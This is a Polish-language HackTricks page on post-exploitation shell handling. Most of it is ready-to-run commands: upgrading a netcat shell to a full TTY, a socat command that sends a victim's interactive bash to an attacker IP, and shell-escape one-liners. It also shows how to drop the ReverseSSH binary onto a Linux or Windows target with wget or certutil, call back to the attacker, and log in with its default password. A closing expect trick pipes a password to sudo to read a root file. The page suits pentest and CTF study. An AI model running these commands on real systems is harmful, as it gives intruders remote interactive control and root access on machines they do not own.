# Pełne TTY

{{#include ../../banners/hacktricks-training.md}}

## Pełne TTY

Pamiętaj, że shell ustawiony w zmiennej `SHELL` **musi** być **wymieniony w** _**/etc/shells**_, w przeciwnym razie pojawi się komunikat `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Pamiętaj również, że poniższe fragmenty działają tylko w bash. Jeśli używasz zsh, przed uzyskaniem shell przełącz się na bash, uruchamiając `bash`.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!TIP]
> Możesz uzyskać **liczbę** **wierszy** i **kolumn**, wykonując **`stty -a`**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Uruchamianie powłok**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Wygodnym sposobem uzyskania **interaktywnego dostępu do powłoki**, a także **transferu plików** i **przekierowania portów**, jest umieszczenie na celu statycznie linkowanego serwera ssh [ReverseSSH](https://github.com/Fahrj/reverse-ssh).<sup>[[1]](#references)</sup>

Poniżej znajduje się przykład dla `x86` z plikami binarnymi skompresowanymi za pomocą upx. W przypadku innych plików binarnych sprawdź [stronę wydań](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Przygotuj lokalnie obsługę żądania przekierowania portu ssh:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Cel Linux:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Cel Windows 10 (w przypadku wcześniejszych wersji sprawdź [project readme](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Jeśli żądanie przekierowania portu ReverseSSH zakończyło się powodzeniem, powinieneś teraz móc zalogować się za pomocą domyślnego hasła `letmeinbrudipls` w kontekście użytkownika uruchamiającego `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) automatycznie podnosi Linux reverse shells do TTY, obsługuje rozmiar terminala, rejestruje wszystko i oferuje wiele innych funkcji. Zapewnia również obsługę readline dla Windows shells.<sup>[[2]](#references)</sup>

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

Jeśli z jakiegoś powodu nie możesz uzyskać full TTY, **nadal możesz wchodzić w interakcję z programami**, które oczekują danych wejściowych od użytkownika. W poniższym przykładzie hasło jest przekazywane do `sudo`, aby odczytać plik:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## Referencje

- [1] [ReverseSSH - Statically-linked ssh server with reverse shell functionality for CTFs and such](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Shell handler that automates a few things to make life easier](https://github.com/brightio/penelope)

{{#include ../../banners/hacktricks-training.md}}
